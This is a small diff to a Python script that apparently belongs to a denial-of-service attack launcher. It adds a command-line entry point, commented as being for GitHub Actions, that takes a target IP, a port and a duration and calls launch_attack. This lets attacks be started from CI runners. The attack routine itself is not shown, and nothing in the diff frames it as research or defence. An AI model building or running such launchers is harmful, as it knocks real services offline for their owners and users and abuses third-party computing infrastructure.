@@ -2,6 +2,7 @@
 import subprocess
 import time
 import threading
+import sys
 
 active_tasks = {}
 task_lock = threading.Lock()
@@ -90,6 +91,11 @@ def cleanup_finished_tasks():
             print(f"[!] Error in cleanup: {e}")
         
         time.sleep(5)
+
+# Support command line arguments for GitHub Actions
+if len(sys.argv) == 4:
+    ip, port, time_val = sys.argv[1], sys.argv[2], sys.argv[3]
+    launch_attack(ip, port, time_val)
 
 # Start cleanup thread
 cleanup_thread = threading.Thread(target=cleanup_finished_tasks, daemon=True)
